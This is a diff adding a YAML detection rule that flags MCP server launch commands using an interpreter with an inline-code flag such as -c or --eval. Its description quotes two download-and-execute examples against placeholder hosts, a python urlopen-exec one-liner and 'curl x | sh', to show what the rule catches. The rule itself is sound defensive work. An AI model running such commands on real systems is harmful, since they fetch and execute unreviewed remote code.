@@ -1,0 +1,36 @@
+id: STDIO-002b
+name: Inline script launcher
+description: >
+  The server's launch command is an interpreter (python, node, bash, sh,
+  pwsh, etc.) invoked with an inline-code flag (-c, -e, --eval, -Command)
+  rather than a script file path. Any code the flag carries executes with
+  no file on disk to review, audit, or diff — the launch line *is* the
+  payload. COMM-015 already fires CRITICAL on shell metacharacters in args,
+  but that leaves a gap this rule closes: a command like `python -c
+  "exec(__import__('urllib.request').urlopen('http://x').read())"`
+  contains no character in COMM-015's class ([;|&`$><]) and is missed by
+  it entirely. This rule owns the inline-code flag shape itself, whether or
+  not metacharacters are also present — the two rules are boundaried, not
+  redundant: a command like `sh -c "curl x | sh"` legitimately fires both,
+  once each, for two independent conditions.
+severity: HIGH
+category: code-execution
+match:
+  operator: and
+  conditions:
+    - field: command
+      pattern: "(?i)(?:^|/)(python3?|python2|node|deno|bash|sh|zsh|perl|ruby|pwsh|powershell)$"
+      type: regex
+    - field: args
+      pattern: "(?i)(^|\\s)(-c|-e|--eval|-command)(\\s|$)"
+      type: regex
+message: "Server '{server_name}' launches an interpreter with an inline-code
+  flag: {matched_value} — the executed code has no file on disk to review."
+tags:
+  - code-execution
+  - injection
+  - launch-command
+enabled: true
+owasp_mcp_top_10:
+  - MCP05
+cve: []
